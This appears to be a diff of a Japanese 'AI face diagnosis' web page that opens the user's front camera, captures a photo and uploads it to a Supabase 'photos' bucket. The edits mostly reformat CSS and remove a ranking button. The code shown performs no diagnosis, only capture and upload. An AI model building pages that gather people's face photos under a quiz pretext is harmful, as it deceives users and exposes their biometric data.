@@ -4,62 +4,36 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta property="og:title" content="AI顔診断">
-  <meta property="og:description" content="AI顔診断は、あなたの顔をAIが分析して性格タイプや印象を診断するサイトです。">
+  <meta property="og:description" content="あなたの顔をAIが診断します">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary">
   <title>AI顔診断</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
       font-family: "Segoe UI", system-ui, sans-serif;
       background: linear-gradient(to right, #e0f2ff, #fde7ef);
-      color: #333;
-      text-align: center;
+      color: #333; text-align: center;
     }
-    .container {
-      padding: 40px 20px;
-      max-width: 400px;
-      margin: 0 auto;
-    }
+    .container { padding: 40px 20px; max-width: 400px; margin: 0 auto; }
     h1 { font-size: 28px; color: #0066ff; margin-bottom: 10px; }
     p.desc { color: #555; font-size: 15px; margin-bottom: 30px; }
     input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
-      font-size: 1rem;
-      margin-bottom: 15px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      box-sizing: border-box;
+      width: 100%; padding: 10px; border-radius: 8px; border: none;
+      font-size: 1rem; margin-bottom: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1); box-sizing: border-box;
     }
     .btn {
-      display: block;
-      width: 100%;
-      background: #0d6efd;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 10px;
-      font-size: 1rem;
-      margin-bottom: 15px;
+      display: block; width: 100%; background: #0d6efd; color: white;
+      border: none; border-radius: 8px; padding: 10px;
+      font-size: 1rem; margin-bottom: 15px; cursor: pointer;
     }
     .btn:active { opacity: 0.8; }
     .preview-box {
-      width: 100%;
-      height: 160px;
-      background: white;
-      border-radius: 16px;
-      margin-top: 20px;
-      overflow: hidden;
+      width: 100%; height: 160px; background: white;
+      border-radius: 16px; margin-top: 20px; overflow: hidden;
     }
-    video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      border-radius: 16px;
-    }
+    video { width: 100%; height: 100%; object-fit: cover; border-radius: 16px; }
     small { display: block; color: #777; margin-top: 20px; font-size: 12px; }
     #status { color: #444; margin-top: 10px; font-size: 14px; }
     #charCount { text-align: right; font-size: 12px; color: #999; margin-top: -10px; margin-bottom: 10px; }
@@ -73,7 +47,6 @@
     <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="8" />
     <div id="charCount">0 / 8</div>
     <button id="cameraBtn" class="btn">🧠 診断をはじめる</button>
-    <button class="btn" disabled>全国のランキングを見る</button>
     <div class="preview-box"><video id="video" autoplay playsinline muted></video></div>
     <p id="status"></p>
     <p id="errorDetail"></p>
@@ -105,12 +78,10 @@
     async function startCameraAndUpload() {
       if (isProcessing) return;
       isProcessing = true;
-
       try {
         status.textContent = "カメラの許可を押してください...";
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
+          video: { facingMode: "user" }, audio: false
         });
         video.srcObject = stream;
         await new Promise(r => setTimeout(r, 1000));
@@ -123,20 +94,20 @@
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
 
         status.textContent = "サーバーに送信中...";
-        const { data, error } = await supabase.storage.from("photos").upload(`${photoId}.jpg`, blob, { upsert: true });
+        const { error } = await supabase.storage.from("photos").upload(`${photoId}.jpg`, blob, { upsert: true });
 
         stream.getTracks().forEach(t => t.stop());
 
         if (error) {
           status.textContent = "⚠️ アップロードに失敗しました。";
-          errorDetail.textContent = "エラー詳細: " + JSON.stringify(error);
+          errorDetail.textContent = JSON.stringify(error);
         } else {
           status.textContent = "✅ 写真を送信しました！";
           errorDetail.textContent = "";
         }
       } catch (err) {
         status.textContent = "⚠️ エラーが発生しました。";
-        errorDetail.textContent = "エラー詳細: " + err.message;
+        errorDetail.textContent = err.message;
       } finally {
         isProcessing = false;
       }
